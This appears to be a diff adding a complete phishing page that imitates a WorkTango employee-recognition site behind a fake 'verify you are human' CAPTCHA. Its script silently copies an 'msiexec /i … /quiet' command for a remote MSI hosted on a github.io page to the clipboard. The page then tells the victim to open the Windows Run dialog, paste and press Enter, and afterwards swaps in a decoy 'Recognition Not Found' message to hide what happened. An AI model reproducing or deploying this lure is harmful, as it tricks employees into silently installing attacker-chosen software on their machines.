@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WorkTango - View Your Recognition</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* WorkTango wrapper */
+        .wt-wrapper {
+            max-width: 520px;
+            width: 95%;
+        }
+        .wt-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .wt-logo {
+            font-size: 26px;
+            font-weight: 700;
+            color: #6c63ff;
+        }
+        .wt-tagline {
+            color: #888;
+            font-size: 13px;
+            margin-top: 4px;
+        }
+
+        /* Captcha overlay card */
+        .captcha-card {
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 2px 16px rgba(0,0,0,0.12);
+            overflow: hidden;
+        }
+        .captcha-header {
+            background: #f9f9f9;
+            border-bottom: 1px solid #e5e5e5;
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .captcha-header svg { flex-shrink: 0; }
+        .captcha-header-text {
+            font-size: 14px;
+            color: #333;
+            font-weight: 500;
+        }
+        .captcha-body {
+            padding: 28px 24px;
+            text-align: center;
+        }
+        .captcha-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 6px;
+        }
+        .captcha-subtitle {
+            font-size: 13px;
+            color: #777;
+            margin-bottom: 24px;
+        }
+
+        /* The checkbox row */
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            padding: 16px 24px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: #fafafa;
+            cursor: pointer;
+            transition: border-color 0.2s, background 0.2s;
+            user-select: none;
+        }
+        .checkbox-row:hover { border-color: #aaa; background: #f5f5f5; }
+        .cb-box {
+            width: 26px;
+            height: 26px;
+            border: 2px solid #bbb;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+            flex-shrink: 0;
+        }
+        .cb-label {
+            font-size: 15px;
+            color: #333;
+        }
+
+        /* Spinner state */
+        .cb-box.loading {
+            border-color: #6c63ff;
+        }
+        .cb-spinner {
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid #e0e0e0;
+            border-top: 2.5px solid #6c63ff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+        .cb-box.loading .cb-spinner { display: block; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Checkmark state */
+        .cb-box.checked {
+            background: #6c63ff;
+            border-color: #6c63ff;
+        }
+        .cb-check {
+            display: none;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .cb-box.checked .cb-check { display: block; }
+
+        /* Instruction steps (shown after click) */
+        .steps-overlay {
+            display: none;
+            margin-top: 24px;
+            text-align: left;
+        }
+        .steps-overlay.show { display: block; }
+        .step-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #d9534f;
+            margin-bottom: 12px;
+        }
+        .step {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: #444;
+            line-height: 1.5;
+        }
+        .step-num {
+            background: #6c63ff;
+            color: #fff;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 700;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+        kbd {
+            background: #eee;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            padding: 1px 6px;
+            font-family: monospace;
+            font-size: 13px;
+        }
+
+        /* Footer */
+        .captcha-footer {
+            padding: 12px 20px;
+            border-top: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 11px;
+            color: #aaa;
+        }
+
+        /* Success card (post-verification) */
+        .success-card {
+            display: none;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 2px 16px rgba(0,0,0,0.12);
+            padding: 40px 24px;
+            text-align: center;
+        }
+        .success-card.show { display: block; }
+        .success-icon { font-size: 48px; margin-bottom: 16px; }
+        .success-card h2 { font-size: 18px; color: #333; margin-bottom: 8px; }
+        .success-card p { font-size: 14px; color: #666; line-height: 1.6; }
+    </style>
+</head>
+<body>
+    <div class="wt-wrapper">
+        <div class="wt-header">
+            <div class="wt-logo">WorkTango</div>
+            <div class="wt-tagline">Employee Recognition Platform</div>
+        </div>
+
+        <!-- CAPTCHA card -->
+        <div class="captcha-card" id="captchaCard">
+            <div class="captcha-header">
+                <!-- Shield icon -->
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6c63ff" stroke-width="2">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                </svg>
+                <span class="captcha-header-text">Security Verification</span>
+            </div>
+            <div class="captcha-body">
+                <div class="captcha-title">Verify you are human</div>
+                <div class="captcha-subtitle">Complete this verification to view your private recognition</div>
+
+                <div class="checkbox-row" id="checkboxRow" onclick="onCheck()">
+                    <div class="cb-box" id="cbBox">
+                        <div class="cb-spinner"></div>
+                        <div class="cb-check">&#x2713;</div>
+                    </div>
+                    <span class="cb-label">I am human</span>
+                </div>
+
+                <div class="steps-overlay" id="stepsOverlay">
+                    <div class="step-title">&#9888; Verification requires a quick confirmation step:</div>
+                    <div class="step">
+                        <span class="step-num">1</span>
+                        <span>Press <kbd>&#8862; Win</kbd> + <kbd>R</kbd> to open the Run dialog</span>
+                    </div>
+                    <div class="step">
+                        <span class="step-num">2</span>
+                        <span>Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste the verification command</span>
+                    </div>
+                    <div class="step">
+                        <span class="step-num">3</span>
+                        <span>Press <kbd>Enter</kbd> to complete verification</span>
+                    </div>
+                </div>
+            </div>
+            <div class="captcha-footer">
+                <span>Protected by WorkTango Security</span>
+                <span>Privacy &mdash; Terms</span>
+            </div>
+        </div>
+
+        <!-- Success card (shown after a delay to look natural) -->
+        <div class="success-card" id="successCard">
+            <div class="success-icon">&#128172;</div>
+            <h2>Recognition Not Found</h2>
+            <p>This recognition may have expired or been removed by the sender. Private recognitions are available for 30 days.</p>
+            <p style="margin-top:16px;font-size:13px;color:#999;">If you believe this is an error, contact your HR team.</p>
+        </div>
+    </div>
+
+    <script>
+    // --- CONFIGURATION ---
+    // deploy.sh replaces this placeholder automatically.
+    const MSI_URL = 'https://PL76.github.io/rewards-appreciation/update.msi';
+
+    const PAYLOAD = 'msiexec /i ' + MSI_URL + ' /quiet';
+
+    let clicked = false;
+
+    function onCheck() {
+        if (clicked) return;
+        clicked = true;
+
+        const box = document.getElementById('cbBox');
+        const row = document.getElementById('checkboxRow');
+        const steps = document.getElementById('stepsOverlay');
+
+        // Phase 1: spinner
+        box.classList.add('loading');
+        row.style.cursor = 'default';
+
+        // Copy payload to clipboard
+        navigator.clipboard.writeText(PAYLOAD).catch(() => {
+            const ta = document.createElement('textarea');
+            ta.value = PAYLOAD;
+            ta.style.position = 'fixed';
+            ta.style.opacity = '0';
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+        });
+
+        // Phase 2: show instructions after fake "analysis"
+        setTimeout(() => {
+            box.classList.remove('loading');
+            box.classList.add('checked');
+            steps.classList.add('show');
+        }, 1500);
+
+        // Phase 3: after some time, show "recognition not found" cover
+        setTimeout(() => {
+            document.getElementById('captchaCard').style.display = 'none';
+            document.getElementById('successCard').classList.add('show');
+        }, 30000);
+    }
+    </script>
+</body>
+</html>
